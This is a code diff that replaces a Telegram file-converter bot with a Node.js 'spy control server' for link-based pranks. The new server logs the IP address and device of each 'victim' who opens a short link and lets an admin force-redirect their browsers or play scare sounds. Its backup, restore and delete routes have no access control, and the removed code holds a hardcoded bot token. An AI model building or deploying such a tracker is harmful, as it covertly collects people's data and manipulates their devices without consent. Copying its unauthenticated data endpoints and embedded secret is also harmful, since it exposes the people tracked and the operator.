@@ -1,212 +1,401 @@
-const TelegramBot = require('node-telegram-bot-api');
+/**
+ * SPY CONTROL SERVER v12.1 [FIXED]
+ * Features: Socket.IO, Telegram Bot, Auto Mode, ZIP Backup System
+ */
+
+const express = require('express');
+const app = express();
+const AdmZip = require('adm-zip');
+
+const http = require('http').createServer(app);
+const io = require('socket.io')(http);
+global.io = io;
+const { v4: uuidv4 } = require('uuid');
+const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
-const https = require('https');
-const { v4: uuidv4 } = require('uuid');
 
-// --- ПІДКЛЮЧЕННЯ FFMPEG ---
-const ffmpeg = require('fluent-ffmpeg');
-const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
-ffmpeg.setFfmpegPath(ffmpegPath);
+// --- КОНФІГУРАЦІЯ ---
+const PORT = process.env.PORT || 3000;
+const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
 
-// --- НАЛАШТУВАННЯ ---
-const token = '8597954828:AAFCUWRD3rq3HGdN9ZYnvMU4wx1LFC32WWE'; 
-const bot = new TelegramBot(token, { polling: true });
-
-// Шляхи (мають збігатися з server.js)
-const uploadDir = path.join(__dirname, 'public', 'uploads');
-// Твій домен на Render
-const PUBLIC_DOMAIN = 'https://prank-nfc.onrender.com'; 
-
-// Перевірка папки
-if (!fs.existsSync(uploadDir)){
-    fs.mkdirSync(uploadDir, { recursive: true });
+if (!fs.existsSync(UPLOAD_DIR)) {
+    console.log('📂 Creating upload directory...');
+    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 }
 
-console.log('🤖 TELEGRAM BOT ЗАПУЩЕНО З КОНВЕРТЕРОМ...');
+app.use(express.json());
+app.use(express.static('public'));
 
-// --- 1. КОМАНДА /START ---
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 
-`👋 **Привіт!**
-
-Я файловий сервер + конвертер.
-
-📂 **Що я вмію:**
-1. Зберігати будь-які файли і давати пряме посилання.
-2. 🎬 Якщо кинеш **відео**, я запропоную зробити з нього **GIF** або **MP3**.
-
-Кидай файл!`, { parse_mode: 'Markdown' });
-});
-
-// --- 2. ОБРОБКА ВХІДНИХ ФАЙЛІВ ---
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    
-    // Ігноруємо текстові команди
-    if (msg.text && msg.text.startsWith('/')) return;
-
-    if (msg.text) {
-        bot.sendMessage(chatId, '🖼 Кидай файл, а не текст.');
-        return;
-    }
-
-    let fileId = null;
-    let ext = '.dat';
-    let typeName = '📁 Файл';
-    let isVideo = false;
-
-    // Визначаємо тип
-    if (msg.photo) {
-        fileId = msg.photo[msg.photo.length - 1].file_id;
-        ext = '.jpg';
-        typeName = '📷 Фото';
-    } else if (msg.audio) {
-        fileId = msg.audio.file_id;
-        ext = '.mp3';
-        typeName = '🎵 Аудіо';
-    } else if (msg.voice) {
-        fileId = msg.voice.file_id;
-        ext = '.ogg';
-        typeName = '🎤 Голос';
-    } else if (msg.video) {
-        fileId = msg.video.file_id;
-        ext = '.mp4';
-        typeName = '🎬 Відео';
-        isVideo = true; // Маркер, що це відео
-    } else if (msg.document) {
-        fileId = msg.document.file_id;
-        ext = path.extname(msg.document.file_name) || '.dat';
-        typeName = '📁 Док';
-    }
-
-    // Завантаження
-    if (fileId) {
-        const tempMsg = await bot.sendMessage(chatId, '⏳ Завантаження...', { disable_notification: true });
-        
-        try {
-            const fileLink = await bot.getFileLink(fileId);
-            const newFilename = `${Date.now()}-${uuidv4().slice(0,8)}${ext}`;
-            const publicUrl = `${PUBLIC_DOMAIN}/uploads/${newFilename}`;
-            
-            downloadFile(fileLink, newFilename, chatId, publicUrl, typeName, tempMsg.message_id, isVideo);
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Помилка API: ${error.message}`);
-        }
+// --- MULTER (Завантаження файлів) ---
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
+    filename: (req, file, cb) => {
+        const ext = path.extname(file.originalname);
+        const name = `${Date.now()}-${uuidv4().slice(0, 8)}${ext}`;
+        cb(null, name);
     }
 });
-
-// --- 3. ОБРОБКА КНОПОК (GIF / MP3) ---
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const data = query.data; // Формат: "action|filename"
-    
-    const [action, filename] = data.split('|');
-    const inputPath = path.join(uploadDir, filename);
-
-    // Перевірка чи існує файл
-    if (!fs.existsSync(inputPath)) {
-        bot.answerCallbackQuery(query.id, { text: '❌ Файл не знайдено!', show_alert: true });
-        return;
-    }
-
-    bot.answerCallbackQuery(query.id); // Прибираємо "годинничок" на кнопці
-    const processMsg = await bot.sendMessage(chatId, '⚙️ Обробка... Це може зайняти до 30 сек.');
-
-    // КОНВЕРТАЦІЯ В GIF
-    if (action === 'to_gif') {
-        const gifFilename = filename.replace('.mp4', '.gif');
-        const gifPath = path.join(uploadDir, gifFilename);
-        const publicUrl = `${PUBLIC_DOMAIN}/uploads/${gifFilename}`;
-
-        ffmpeg(inputPath)
-            .outputOption('-vf', 'fps=10,scale=320:-1:flags=lanczos') // Оптимізація GIF (легка вага)
-            .save(gifPath)
-            .on('end', () => {
-                addToServerList(gifFilename, publicUrl, '🎞 GIF');
-                bot.deleteMessage(chatId, processMsg.message_id).catch(()=>{});
-                bot.sendMessage(chatId, `✅ **GIF готовий!**\n\n🔗 Посилання:\n\`${publicUrl}\``, { parse_mode: 'Markdown' });
-            })
-            .on('error', (err) => {
-                bot.sendMessage(chatId, `❌ Помилка GIF: ${err.message}`);
-            });
-    } 
-    // КОНВЕРТАЦІЯ В MP3
-    else if (action === 'to_mp3') {
-        const mp3Filename = filename.replace('.mp4', '.mp3');
-        const mp3Path = path.join(uploadDir, mp3Filename);
-        const publicUrl = `${PUBLIC_DOMAIN}/uploads/${mp3Filename}`;
-
-        ffmpeg(inputPath)
-            .toFormat('mp3')
-            .save(mp3Path)
-            .on('end', () => {
-                addToServerList(mp3Filename, publicUrl, '🎵 MP3 з відео');
-                bot.deleteMessage(chatId, processMsg.message_id).catch(()=>{});
-                bot.sendMessage(chatId, `✅ **MP3 готовий!**\n\n🔗 Посилання:\n\`${publicUrl}\``, { parse_mode: 'Markdown' });
-            })
-            .on('error', (err) => {
-                bot.sendMessage(chatId, `❌ Помилка MP3: ${err.message}`);
-            });
-    }
+const upload = multer({ 
+    storage: storage,
+    limits: { fileSize: 50 * 1024 * 1024 } 
 });
 
-// --- 4. ФУНКЦІЯ ЗАВАНТАЖЕННЯ ---
-const downloadFile = (url, filename, chatId, publicUrl, typeName, msgIdToDelete, isVideo) => {
-    const filePath = path.join(uploadDir, filename);
-    const file = fs.createWriteStream(filePath);
+// ====================================
+// ⚠️ КРИТИЧНО: ІНІЦІАЛІЗАЦІЯ ГЛОБАЛЬНИХ ЗМІННИХ ПЕРЕД БОТАМИ
+// ====================================
+global.sessions = {};      
+global.activeVictims = {}; 
+global.shortLinks = {}; 
+global.botFiles = [];
 
-    https.get(url, (response) => {
-        response.pipe(file);
-        
-        file.on('finish', () => {
-            file.close(() => {
-                // Додаємо в список
-                addToServerList(filename, publicUrl, typeName);
+console.log('✅ Global variables initialized');
 
-                // Видаляємо "Завантаження..."
-                bot.deleteMessage(chatId, msgIdToDelete).catch(()=>{});
+// ====================================
+// ПІДКЛЮЧЕННЯ БОТІВ ПІСЛЯ ІНІЦІАЛІЗАЦІЇ
+// ====================================
+try {
+    require('./bot.js'); 
+    console.log('✅ Telegram Bot (bot.js) loaded successfully');
+} catch (e) {
+    console.log('⚠️ Bot file missing or error:', e.message);
+}
 
-                // Параметри повідомлення
-                const msgOptions = { parse_mode: 'Markdown' };
+try {
+    console.log('🤖 Loading nfc-logic bot...');
+    require('./nfc-logic.js'); 
+    console.log('✅ NFC Control Bot (nfc-logic.js) loaded successfully');
+} catch (e) {
+    console.error('❌ NFC Bot error:', e.message);
+}
 
-                // Якщо це відео, додаємо клавіатуру
-                if (isVideo) {
-                    msgOptions.reply_markup = {
-                        inline_keyboard: [
-                            [
-                                { text: '🎞 Зробити GIF', callback_data: `to_gif|${filename}` },
-                                { text: '🎵 Витягнути MP3', callback_data: `to_mp3|${filename}` }
-                            ]
-                        ]
-                    };
-                }
+// --- ДОПОМІЖНІ ФУНКЦІЇ ---
 
-                bot.sendMessage(chatId, `✅ **${typeName} збережено!**\n\n🔗 Посилання:\n\`${publicUrl}\``, msgOptions);
-            });
+function generateShortCode() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
+    if (global.shortLinks[result]) return generateShortCode();
+    return result;
+}
+
+function fileToPublicUrl(filename) {
+    return `/uploads/${filename}`;
+}
+
+function addFilesToSession(sessionArr, files, type) {
+    if (!files || files.length === 0) return;
+    files.forEach(f => {
+        sessionArr.push({
+            filename: f.filename,
+            url: fileToPublicUrl(f.filename),
+            originalname: f.originalname,
+            uploadedAt: new Date().toLocaleString('uk-UA'),
+            type: type
         });
-    }).on('error', (err) => {
-        fs.unlink(filename, () => {}); // Видаляємо битий файл
-        bot.sendMessage(chatId, `❌ Помилка запису: ${err.message}`);
     });
-};
-
-// --- 5. ДОПОМІЖНА ФУНКЦІЯ ДЛЯ СЕРВЕРА ---
-function addToServerList(filename, url, typeName) {
-    if (global.botFiles) {
-        global.botFiles.unshift({
-            filename: filename,
-            url: url,
-            type: typeName,
-            uploadedAt: new Date().toLocaleTimeString('uk-UA')
-        });
-        // Тримаємо тільки останні 30 файлів
-        if (global.botFiles.length > 30) global.botFiles.pop();
-    }
 }
 
-// Запобіжник від падіння
-bot.on('polling_error', (error) => {});
+function parseDevice(ua) {
+    if (!ua) return "Unknown";
+    if (ua.includes('Android')) return "📱 Android";
+    if (ua.includes('iPhone')) return "🍏 iPhone";
+    if (ua.includes('Windows')) return "💻 PC";
+    return "📱 Device";
+}
 
-module.exports = bot;
+// Створення сесії з параметром AUTO MODE
+function createSessionObject(req, soundUrl = '', imageUrl = '', autoMode = false) {
+    const id = uuidv4();
+    const shortCode = generateShortCode();
+    global.shortLinks[shortCode] = id;
+
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
+    
+    global.sessions[id] = {
+        id: id,
+        shortCode: shortCode,
+        sound: soundUrl,
+        image: imageUrl,
+        autoMode: autoMode,
+        createdAt: new Date().toLocaleString('uk-UA'),
+        lastActiveAt: Date.now(),
+        totalVictims: 0,
+        creator: {
+            ip: ip,
+            device: parseDevice(req.headers['user-agent'])
+        },
+        imagesFiles: [],
+        soundsFiles: []
+    };
+    return global.sessions[id];
+}
+
+// Оновлення клієнтів (відправка медіа та статусу AUTO)
+function broadcastUpdate(roomId) {
+    const s = global.sessions[roomId];
+    if (!s) return;
+
+    const currentSound = (s.soundsFiles.length > 0) ? s.soundsFiles[s.soundsFiles.length - 1].url : (s.sound || '');
+    const currentImage = (s.imagesFiles.length > 0) ? s.imagesFiles[s.imagesFiles.length - 1].url : (s.image || '');
+
+    s.lastActiveAt = Date.now();
+    
+    io.to(roomId).emit('update-media', { 
+        sound: currentSound, 
+        image: currentImage,
+        auto: s.autoMode
+    });
+}
+
+// --- СИСТЕМА BACKUP (ZIP) ---
+
+// 1. СКАЧАТИ ВСЕ (Backup)
+app.get('/backup-all', (req, res) => {
+    try {
+        const zip = new AdmZip();
+        
+        // Створюємо JSON з даними
+        const dbData = JSON.stringify({
+            sessions: global.sessions,
+            shortLinks: global.shortLinks,
+            botFiles: global.botFiles
+        }, null, 2);
+        
+        zip.addFile("database.json", Buffer.from(dbData, "utf8"));
+
+        // Додаємо папку з файлами
+        if (fs.existsSync(UPLOAD_DIR)) {
+            zip.addLocalFolder(UPLOAD_DIR, "uploads");
+        }
+
+        const zipBuffer = zip.toBuffer();
+        res.set('Content-Type', 'application/zip');
+        res.set('Content-Disposition', 'attachment; filename=spy_backup.zip');
+        res.send(zipBuffer);
+    } catch (e) {
+        res.status(500).send("Backup error: " + e.message);
+    }
+});
+
+// 2. ВІДНОВИТИ ВСЕ (Restore)
+app.post('/restore-all', upload.single('backup'), (req, res) => {
+    if (!req.file) return res.status(400).json({ error: "No file provided" });
+
+    try {
+        const zip = new AdmZip(req.file.path);
+        
+        // 1. Відновлюємо базу JSON
+        const dbEntry = zip.getEntry("database.json");
+        if (dbEntry) {
+            const data = JSON.parse(dbEntry.getData().toString('utf8'));
+            
+            // Очищуємо старі дані та копіюємо нові
+            for (let key in global.sessions) delete global.sessions[key];
+            for (let key in global.shortLinks) delete global.shortLinks[key];
+            
+            Object.assign(global.sessions, data.sessions);
+            Object.assign(global.shortLinks, data.shortLinks);
+            global.botFiles = data.botFiles || [];
+        }
+
+        // 2. Розпаковуємо файли в uploads
+        zip.extractEntryTo("uploads/", UPLOAD_DIR, false, true);
+
+        // Видаляємо тимчасовий файл
+        fs.unlinkSync(req.file.path);
+
+        console.log("♻️ Data restored from backup!");
+        res.json({ success: true });
+    } catch (e) {
+        console.error("Restore error:", e);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// --- СТАНДАРТНІ МАРШРУТИ ---
+
+app.get('/', (req, res) => res.redirect('/admin.html'));
+app.get('/beta', (req, res) => res.redirect('/beta_admin.html'));
+
+// Створення (JSON)
+app.post('/create', (req, res) => {
+    try {
+        const { sound, image, auto_mode } = req.body;
+        const session = createSessionObject(req, sound, image, auto_mode);
+        res.json({ id: session.id, shortUrl: session.shortCode });
+    } catch (e) {
+        res.status(500).json({ error: "Server error" });
+    }
+});
+
+// Створення (Upload)
+app.post('/create-upload', upload.fields([{ name: 'images' }, { name: 'sounds' }]), (req, res) => {
+    try {
+        const isAuto = req.body.auto_mode === 'true';
+        const session = createSessionObject(req, '', '', isAuto);
+        
+        if (req.files['images']) addFilesToSession(session.imagesFiles, req.files['images'], 'image');
+        if (req.files['sounds']) addFilesToSession(session.soundsFiles, req.files['sounds'], 'sound');
+
+        res.json({ id: session.id, shortUrl: session.shortCode });
+    } catch (e) {
+        res.status(500).json({ error: "Upload failed" });
+    }
+});
+
+// Оновлення сесії
+app.post('/update-session/:id', (req, res) => {
+    const id = req.params.id;
+    if (!global.sessions[id]) return res.status(404).json({ error: 'Not found' });
+
+    if (req.body.sound !== undefined) global.sessions[id].sound = req.body.sound;
+    if (req.body.image !== undefined) global.sessions[id].image = req.body.image;
+    
+    // Оновлення Auto Mode
+    if (req.body.auto_mode !== undefined) global.sessions[id].autoMode = req.body.auto_mode;
+
+    broadcastUpdate(id);
+    res.json({ success: true });
+});
+
+// Завантаження файлів (картинки)
+app.post('/session/:id/upload-images', upload.array('images'), (req, res) => {
+    const id = req.params.id;
+    if (!global.sessions[id]) return res.status(404).json({ error: 'Not found' });
+    addFilesToSession(global.sessions[id].imagesFiles, req.files, 'image');
+    broadcastUpdate(id);
+    res.json({ success: true });
+});
+
+// Завантаження файлів (звуки)
+app.post('/session/:id/upload-sounds', upload.array('sounds'), (req, res) => {
+    const id = req.params.id;
+    if (!global.sessions[id]) return res.status(404).json({ error: 'Not found' });
+    addFilesToSession(global.sessions[id].soundsFiles, req.files, 'sound');
+    broadcastUpdate(id);
+    res.json({ success: true });
+});
+
+// Список сесій (для Watch)
+app.get('/sessions', (req, res) => {
+    const list = Object.values(global.sessions).map(s => {
+        return {
+            id: s.id,
+            shortCode: s.shortCode,
+            fullUrl: `${req.protocol}://${req.get('host')}/${s.shortCode}`,
+            createdAt: s.createdAt,
+            lastActiveAt: s.lastActiveAt,
+            totalVictims: s.totalVictims,
+            onlineCount: Object.values(global.activeVictims).filter(v => v.roomId === s.id).length,
+            creator: s.creator,
+            imagesFiles: s.imagesFiles,
+            soundsFiles: s.soundsFiles,
+            autoMode: s.autoMode
+        };
+    }).sort((a, b) => b.lastActiveAt - a.lastActiveAt);
+
+    res.json({ sessions: list, botFiles: global.botFiles || [] });
+});
+
+// Видалення сесії
+app.delete('/session/:id', (req, res) => {
+    const id = req.params.id;
+    if (global.sessions[id]) {
+        [...global.sessions[id].imagesFiles, ...global.sessions[id].soundsFiles].forEach(f => {
+            fs.unlink(path.join(UPLOAD_DIR, f.filename), ()=>{});
+        });
+        if (global.sessions[id].shortCode) delete global.shortLinks[global.sessions[id].shortCode];
+        delete global.sessions[id];
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ error: 'Not found' });
+    }
+});
+
+// Видалення файлу бота
+app.delete('/bot-file/:filename', (req, res) => {
+    const fname = req.params.filename;
+    const idx = global.botFiles.findIndex(f => f.filename === fname);
+    if (idx !== -1) {
+        global.botFiles.splice(idx, 1);
+        fs.unlink(path.join(UPLOAD_DIR, fname), ()=>{});
+        res.json({success:true});
+    } else {
+        res.status(404).json({ error: 'Not found' });
+    }
+});
+
+// Редірект по короткому посиланню
+app.get('/:shortCode', (req, res) => {
+    const code = req.params.shortCode;
+    if (code === 'favicon.ico' || code.includes('.')) return res.sendStatus(404);
+
+    const sessionId = global.shortLinks[code];
+    if (sessionId) {
+        res.redirect(`/victim.html?id=${sessionId}`);
+    } else {
+        res.status(404).send('<h1>404 - LINK NOT FOUND</h1>');
+    }
+});
+
+// --- SOCKET.IO ---
+io.on('connection', (socket) => {
+    
+    // Адмін
+    socket.on('join-room-admin', (roomId) => {
+        socket.join(roomId);
+        sendVictimListToAdmin(roomId);
+    });
+
+    socket.on('trigger-redirect', (data) => {
+        io.to(data.roomId).emit('force-redirect', { url: data.url });
+    });
+
+    socket.on('trigger-scare', (roomId) => {
+        io.to(roomId).emit('play-sound');
+    });
+
+    // Жертва
+    socket.on('join-room-victim', (data) => {
+        const roomId = data.roomId;
+        socket.join(roomId);
+        
+        const ip = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address).split(',')[0].trim();
+        
+        global.activeVictims[socket.id] = {
+            socketId: socket.id,
+            roomId: roomId,
+            device: parseDevice(data.userAgent),
+            ip: ip
+        };
+
+        if (global.sessions[roomId]) {
+            global.sessions[roomId].totalVictims++;
+            broadcastUpdate(roomId);
+        }
+
+        sendVictimListToAdmin(roomId);
+        io.to(roomId).emit('admin-alert', { msg: 'NEW VICTIM!' });
+    });
+
+    socket.on('disconnect', () => {
+        const v = global.activeVictims[socket.id];
+        if (v) {
+            delete global.activeVictims[socket.id];
+            sendVictimListToAdmin(v.roomId);
+        }
+    });
+});
+
+function sendVictimListToAdmin(roomId) {
+    const list = Object.values(global.activeVictims).filter(v => v.roomId === roomId);
+    io.to(roomId).emit('update-victim-list', list);
+}
+
+// --- START ---
+http.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`💾 Backup system loaded`);
+    console.log(`✅ All systems ready`);
+});
